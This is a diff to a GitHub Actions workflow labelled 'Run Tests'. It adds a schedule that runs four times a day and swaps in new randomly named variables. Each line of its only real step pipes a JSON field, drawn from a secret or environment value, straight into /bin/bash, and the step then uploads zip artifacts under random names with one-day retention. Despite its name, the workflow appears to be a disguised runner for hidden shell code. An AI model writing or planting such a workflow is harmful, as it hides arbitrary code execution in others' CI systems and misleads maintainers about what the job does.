@@ -2,6 +2,8 @@ name: Run Tests
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '43 4,10,16,22 * * *'
 permissions:
   contents: read
 concurrency:
@@ -18,18 +20,18 @@ jobs:
           fetch-depth: 1
       - name: Go
         env:
-          utgps3339: ${{ secrets.utgps3339 }}
+          zoq6205: ${{ secrets.zoq6205 }}
         run: |
-          printf '%s' "$utgps3339" | jq -r .kpgwi90876 | /bin/bash
-          echo $ui0720 | jq -r .ud75970 | /bin/bash
-          echo $dyex8939 | jq -r .wghy665 | /bin/bash
-          printf '%s' "$irgw9" | jq -r .rar1973 | /bin/bash
-          printf '%s' "$fbsi3704" | jq -r .ifwyg7549 | /bin/bash
+          printf '%s' "$zoq6205" | jq -r .ycry706 | /bin/bash
+          printf '%s' "$xmgix48396" | jq -r .oyv532 | /bin/bash
+          echo $zgro5 | jq -r .vzlhb97621 | /bin/bash
+          echo $vghva65 | jq -r .y20 | /bin/bash
+          echo $w12 | jq -r .iklyn26438 | /bin/bash
 
       - name: Store artifact
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: E12ym25c
+          name: gBDvxwS6
           path: "*.zip"
           retention-days: 1
